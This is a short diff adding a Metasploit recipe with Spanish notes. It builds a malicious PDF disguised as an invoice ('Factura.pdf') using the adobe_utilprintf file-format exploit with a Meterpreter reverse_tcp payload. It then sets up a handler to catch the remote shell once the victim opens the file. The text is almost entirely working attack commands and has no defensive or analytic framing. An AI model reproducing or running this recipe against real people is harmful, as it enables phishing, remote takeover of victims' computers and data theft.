@@ -1,0 +1,16 @@
+use exploit/windows/fileformat/adobe_utilprintf
+
+set FILENAME Factura.pdf
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.0.128 -> ip máquina local
+set LPORT 4444
+
+Run
+
+cuando la vicitma ejecute el pdf: 
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 4444
+set LHOST ip local
+exploit
